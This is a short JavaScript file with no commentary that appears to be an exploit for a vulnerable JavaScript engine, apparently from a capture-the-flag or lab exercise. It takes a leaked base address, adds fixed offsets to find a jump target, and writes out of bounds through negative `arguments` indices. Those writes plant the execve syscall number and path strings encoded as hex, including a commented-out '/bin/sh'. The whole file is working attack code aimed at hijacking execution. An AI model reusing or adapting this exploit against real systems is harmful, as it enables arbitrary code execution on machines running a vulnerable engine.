if (1 > 0) {
    var current_base;
    function func() {
        var offset = 0x002e3fe4f8e000 - 50851959333187;
        alert(arguments[0]);
        current_base = (arguments[0] + offset);
    }
    func();
    alert(current_base);
    var t = 0xf050f5f58;
    var i = 0xf050f5f58;
    var t = 0x54545454;
    var t = 0xf050f5f58;
    var offset2 = 0x6FEEF9B851b0 - 0x006feef9b85000;
    var jump_location = offset2 + current_base;
    //alert(jump_location);
    var offset3 = 59 - 50;
    var stack_location;
    function func3(){
        if(i == 2){
            return;
        }
        if(i == 0xf050f5f58){
            arguments[0] = jump_location;
            arguments[-1] = 59;
            //arguments[-2] = 0x2F62696E2F736820;
            i = 1;
        }else{
            //alert(jump_location+0x22);
            arguments[0] = jump_location+0x16;
            arguments[-1] = 59;
            alert(arguments[-7]);
            arguments[-2] = arguments[-7];
            arguments[-8] = 0x636F6C2F727375 * 0x100;
            arguments[-8] += 0x2f; // /
            arguments[-9] = 0x6c2F6E69622F6C * 0x100;
            arguments[-9] += 0x61; // a
            arguments[-10] = 0x743333;
            i = 2;
            arguments[-6] = 0x0;
            arguments[-5] = 0x0;
        } 
    }
    func3();
}

